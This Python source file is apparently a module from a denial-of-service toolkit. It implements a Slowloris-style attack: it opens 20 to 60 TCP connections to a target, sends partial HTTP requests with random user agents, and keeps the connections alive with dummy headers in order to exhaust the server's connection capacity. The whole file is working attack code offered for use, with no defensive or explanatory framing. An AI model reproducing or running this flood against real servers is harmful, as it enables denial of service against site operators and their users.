import random
import socket

from colorama import Fore  # type: ignore[import]

import tools.random_data as random_data  # type: ignore[import]


# Initial socket
def create_socket(target):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((target[0], target[1]))

        sock.send(
            "GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")
        )
        sock.send(
            "User-Agent: {}\r\n".format(random_data.random_useragent()).encode("utf-8")
        )
        sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    except socket.timeout:
        print(f"{Fore.RED}[-] {Fore.MAGENTA}Time's up...{Fore.RESET}")
    except socket.error:
        print(
            f"{Fore.RED}[-] {Fore.MAGENTA}There was an error creating socket{Fore.RESET}"
        )
    else:
        print(f"{Fore.GREEN}[+] {Fore.YELLOW}Socket created..{Fore.RESET}")
        return sock


def flood(target):

    # Creates sockets
    sockets = []
    for _ in range(random.randint(20, 60)):
        sock = create_socket(target)
        if not sock:
            continue
        sockets.append(sock)

    # Sends headers keep-alive
    for _ in range(4):
        for index, sock in enumerate(sockets):
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                print(
                    f"{Fore.RED}[-] {Fore.MAGENTA}There was an error sending headers keep-alive{Fore.RESET}"
                )
                sockets.remove(sock)
            else:
                print(
                    f"{Fore.GREEN}[+] {Fore.YELLOW}Sending headers keep-alive to {'{}:{}'.format(*target)} from socket {index + 1}. {Fore.RESET}"
                )
